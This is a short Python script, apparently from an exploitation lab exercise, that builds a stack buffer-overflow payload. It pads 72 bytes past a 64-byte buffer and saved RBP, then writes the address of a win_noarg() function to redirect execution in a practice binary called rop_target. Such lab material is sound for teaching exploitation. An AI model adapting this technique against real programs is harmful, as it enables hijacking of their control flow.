#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause
"""
Goal 1: redirect execution to win_noarg() — no arguments needed.

Stack layout (from buf[0]):
  72 bytes padding (64 buf + 8 saved RBP)
  win_noarg address

Find address:
  nm rop_target | grep win_noarg
"""

import os, struct

def p64(n): return struct.pack("<Q", n)

# ── set this after running: nm rop_target | grep win_noarg ───────────────────
win_noarg_addr = 0x0000000000401234   # PLACEHOLDER
# ─────────────────────────────────────────────────────────────────────────────

offset = 72   # 64-byte buffer + 8-byte saved RBP

payload  = offset * b"A"
payload += p64(win_noarg_addr)

os.write(1, payload)
